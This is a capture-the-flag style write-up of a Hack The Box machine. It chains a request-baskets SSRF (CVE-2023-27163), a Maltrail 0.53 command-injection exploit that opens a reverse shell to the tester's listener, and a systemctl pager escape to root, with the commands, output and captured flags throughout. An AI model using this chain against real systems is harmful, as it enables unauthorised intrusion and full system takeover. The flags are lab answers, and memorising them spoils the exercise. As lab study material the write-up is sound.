# Flags
- User
	- 687a2c9a0f5f5330cbb47e2fee9d9e6d
- Root
	- b3c558c0409d1e22ba9baacc617ab19c


# Notes
- First, let's start with rustscan
```
rustscan --ulimit 5000 --addresses "10.129.6.130" --top -- -sC -sV
```
- Seems we have an SSH server and another service that didn't like nmap that much
```
PORT      STATE SERVICE REASON         VERSION                                                                                                                                                                                                 
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)                                                                                                                                            
| ssh-hostkey:                                                                                                                                                                                                                                 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)                                                                                                                                                                                                
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSklB  
02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8ml  
+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=                                                                                                                                                             
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)                                                                                                                                                                                               
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=                                                                             
|   256 b30c47fba2f212ccce0b58820e504336 (ED25519)                                                                                                                                                                                             
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi                                                                                                                                                             
55555/tcp open  unknown syn-ack ttl 63                                                                                                                                                                                                         
| fingerprint-strings:                                                                                                                                                                                                                         
|   FourOhFourRequest:                                                                                                                                                                                                                         
|     HTTP/1.0 400 Bad Request                                                                                                                                                                                                                 
|     Content-Type: text/plain; charset=utf-8                                                                                                                                                                                                  
|     X-Content-Type-Options: nosniff                                                                                                                                                                                                          
|     Date: Sat, 31 Jan 2026 03:50:29 GMT                                                                                                                                                                                                      
|     Content-Length: 75                                                                                                                                                                                                                       
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$                                                                                                                                                                  
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:                                                                                                                   
|     HTTP/1.1 400 Bad Request                                                                                                                                                                                                                 
|     Content-Type: text/plain; charset=utf-8                                                                                                                                                                                                  
|     Connection: close                                                                                                                                                                                                                        
|     Request                                                                                                                                                                                                                                  
|   GetRequest:                                                                                                                                                                                                                                
|     HTTP/1.0 302 Found  
|     Content-Type: text/html; charset=utf-8  
|     Location: /web  
|     Date: Sat, 31 Jan 2026 03:50:01 GMT  
|     Content-Length: 27  
|     href="/web">Found</a>.  
|   HTTPOptions:    
|     HTTP/1.0 200 OK  
|     Allow: GET, OPTIONS  
|     Date: Sat, 31 Jan 2026 03:50:01 GMT  
|_    Content-Length: 0
```
- Appears to be using LDAP or something like that
- Typing the IP and port into the browser, it appears to be a service called request-baskets running.
- Appears to be specifically 1.2.1. Possible exploits with that?
- I will go ahead and run an exploitdb search:
```
[Jan 30, 2026 - 19:55:45 (PST)] exegol-htb-labs /workspace # searchsploit "request-baskets 1.2.1"  
Exploits: No Results  
Shellcodes: No Results
```
- Nothing there, so will go ahead and search manually
- After doing so, I found what looks like a CVE about a server-side request forgery exploit
	- https://nvd.nist.gov/vuln/detail/CVE-2023-27163
- Not able to find a metasploit solution, but was able to come across this GitHub repo with some code we can try out:
	- https://github.com/entr0pie/CVE-2023-27163
- First, I will go ahead and download the exploit:
```
[Jan 30, 2026 - 20:08:49 (PST)] exegol-htb-labs /workspace # wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh  
--2026-01-30 20:08:57--  https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh  
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...  
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 1669 (1.6K) [text/plain]  
Saving to: ‘CVE-2023-27163.sh’  
  
CVE-2023-27163.sh                                          100%[========================================================================================================================================>]   1.63K  --.-KB/s    in 0s         
  
2026-01-30 20:08:57 (76.2 MB/s) - ‘CVE-2023-27163.sh’ saved [1669/1669]  
  
[Jan 30, 2026 - 20:08:57 (PST)] exegol-htb-labs /workspace # ls  
CVE-2023-27163.sh
```
- I will also start a listener as well to capture
```
nc -lvp 4444
```
- I go ahead and run the exploit
```
[Jan 30, 2026 - 20:08:59 (PST)] exegol-htb-labs /workspace # bash ./CVE-2023-27163.sh http://10.129.6.130:55555 http://10.10.15.4:4444  
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163  
  
> Creating the "qhtnvy" proxy basket...  
> Basket created!  
> Accessing http://10.129.6.130:55555/qhtnvy now makes the server request to http://10.10.15.4:4444.  
> Authorization: 8VGMCPfVAtSpyZLf4KxrG_pZhGNO5QLgBl_4vOG5ET7R
```
- From here, when I visit it, I am able to get information back:
```
[Jan 30, 2026 - 20:08:28 (PST)] exegol-htb-labs /workspace # nc -lvp 4444  
Ncat: Version 7.93 ( https://nmap.org/ncat )  
Ncat: Listening on :::4444  
Ncat: Listening on 0.0.0.0:4444  
Ncat: Connection from 10.129.6.130.  
Ncat: Connection from 10.129.6.130:58780.  
GET / HTTP/1.1  
Host: 10.10.15.4:4444  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Encoding: gzip, deflate  
Accept-Language: en-US,en;q=0.5  
Priority: u=0, i  
Upgrade-Insecure-Requests: 1  
X-Do-Not-Forward: 1
```
- Now that I've confirmed the exploit is working, let's see if there are any HTTP apps running
```
bash ./CVE-2023-27163.sh http://10.129.6.130:55555 http://127.0.0.1:80
```
- Going to given URL, we are able to see that Malttrail v0.53.
- I wonder if there is another exploit we can use!
- Looking it up, there is an RCE associated with this version, perfect!
	- https://github.com/spookier/Maltrail-v0.53-Exploit
- I'll go ahead and download a copy of it
```
[Jan 30, 2026 - 20:34:38 (PST)] exegol-htb-labs /workspace # git clone https://github.com/spookier/Maltrail-v0.53-Exploit.git  
Cloning into 'Maltrail-v0.53-Exploit'...  
remote: Enumerating objects: 17, done.  
remote: Counting objects: 100% (17/17), done.  
remote: Compressing objects: 100% (12/12), done.  
remote: Total 17 (delta 4), reused 9 (delta 3), pack-reused 0 (from 0)  
Receiving objects: 100% (17/17), 4.44 KiB | 4.44 MiB/s, done.  
Resolving deltas: 100% (4/4), done.  
[Jan 30, 2026 - 20:34:41 (PST)] exegol-htb-labs /workspace # ls  
CVE-2023-27163.sh  Maltrail-v0.53-Exploit  
[Jan 30, 2026 - 20:34:43 (PST)] exegol-htb-labs /workspace # cd Maltrail-v0.53-Exploit    
[Jan 30, 2026 - 20:34:45 (PST)] exegol-htb-labs Maltrail-v0.53-Exploit # ls  
exploit.py  README.md
```
- Now, we are ready to run it:
```
[Jan 30, 2026 - 20:34:46 (PST)] exegol-htb-labs Maltrail-v0.53-Exploit # python exploit.py 10.10.15.4 4444 http://10.129.6.130:55555/ryjcgm  
Running exploit on http://10.129.6.130:55555/ryjcgm/login
```
- From this, we can see that we get a shell!
```
[Jan 30, 2026 - 20:23:43 (PST)] exegol-htb-labs /workspace # nc -lvnp 4444  
Ncat: Version 7.93 ( https://nmap.org/ncat )  
Ncat: Listening on :::4444  
Ncat: Listening on 0.0.0.0:4444  
Ncat: Connection from 10.129.6.130.  
Ncat: Connection from 10.129.6.130:35182.  
$
```
- We can then upgrade the shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- We are then able to learn the name of the user
```
puma@sau:/opt/maltrail$
```
- We can now go ahead and grab our user flag
```
puma@sau:~$ cat user.txt  
cat user.txt  
687a2c9a0f5f5330cbb47e2fee9d9e6d
```
- Now, we are just left with the root flag
- We need to find some way of privilege escalating
- First, I ran sudo -l to see what we have privileges on, and did get something
```
puma@sau:~$ sudo -l  
sudo -l  
Matching Defaults entries for puma on sau:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User puma may run the following commands on sau:  
   (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service  
puma@sau:~$
```
- It seems that we can use the systemctl command
- What is notable is that we have systemd 245 (245.4-4ubuntu3.22)
- Once again, this results in ANOTHER exploit!
	- https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7
- Seems super simple, and was able to pull it off
```
puma@sau:~$ sudo /usr/bin/systemctl status trail.service                                                                                                                                                                                      
sudo /usr/bin/systemctl status trail.service                                                                                   
WARNING: terminal is not fully functional  
-  (press RETURN)  
● trail.service - Maltrail. Server of malicious traffic detection system  
    Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>  
    Active: active (running) since Sat 2026-01-31 03:44:27 UTC; 1h 6min ago  
      Docs: https://github.com/stamparm/maltrail#readme  
            https://github.com/stamparm/maltrail/wiki  
  Main PID: 877 (python3)  
     Tasks: 12 (limit: 4662)  
    Memory: 35.2M  
    CGroup: /system.slice/trail.service  
            ├─ 877 /usr/bin/python3 server.py  
            ├─1058 /bin/sh -c logger -p auth.info -t "maltrail[877]" "Failed p>  
            ├─1059 /bin/sh -c logger -p auth.info -t "maltrail[877]" "Failed p>  
            ├─1062 sh  
            ├─1069 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>  
            ├─1070 /bin/sh  
            ├─1088 python3 -c import pty; pty.spawn("/bin/bash")  
            ├─1089 /bin/bash  
            ├─1222 sudo /usr/bin/systemctl status trail.service  
            ├─1223 /usr/bin/systemctl status trail.service  
            └─1224 pager  
  
Jan 31 03:44:27 sau systemd[1]: Started Maltrail. Server of malicious traffic d>  
Jan 31 04:42:44 sau sudo[1104]:     puma : TTY=pts/1 ; PWD=/home/puma ; USER=ro>  
lines 1-23  
Jan 31 04:48:28 sau sudo[1218]:     puma : TTY=pts/1 ; PWD=/home/puma ; USER=ro>  
lines 2-24  
Jan 31 04:48:28 sau sudo[1218]: pam_unix(sudo:session): session opened for user>  
lines 3-25  
Jan 31 04:48:35 sau sudo[1218]: pam_unix(sudo:session): session closed for user>  
lines 4-26  
Jan 31 04:50:28 sau sudo[1222]:     puma : TTY=pts/1 ; PWD=/home/puma ; USER=ro>  
lines 5-27  
Jan 31 04:50:28 sau sudo[1222]: pam_unix(sudo:session): session opened for user>  
lines 6-28  
lines 6-28/28 (END)!sh  
!sshh!sh  
# whoami  
whoami  
root
```
- Now, we are root!
- We can now grab our root flag to fully pwn the box
```
# cat root.txt  
cat root.txt  
b3c558c0409d1e22ba9baacc617ab19c  
#
```
